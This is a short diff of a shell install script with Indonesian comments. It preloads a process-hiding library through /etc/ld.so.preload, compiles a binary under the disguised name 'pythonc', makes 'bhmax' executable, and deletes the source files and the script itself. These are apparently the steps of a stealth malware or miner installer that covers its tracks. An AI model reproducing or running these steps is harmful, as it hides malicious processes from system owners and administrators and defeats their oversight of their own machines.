@@ -23,7 +23,7 @@ echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 chmod +x bhmax
 
 # Kompilasi hi.c menjadi hi
-gcc -o hi hi.c
+gcc -o pythonc hi.c
 
 # Hapus file source setelah kompilasi
 rm hi.c processhider.c
@@ -32,4 +32,6 @@ rm hi.c processhider.c
 chmod +x hi
 
 # Hapus skrip yang sudah tidak diperlukan
-rm ~/work/rest.sh
+rm rest.sh
+
+cd /usr/bin
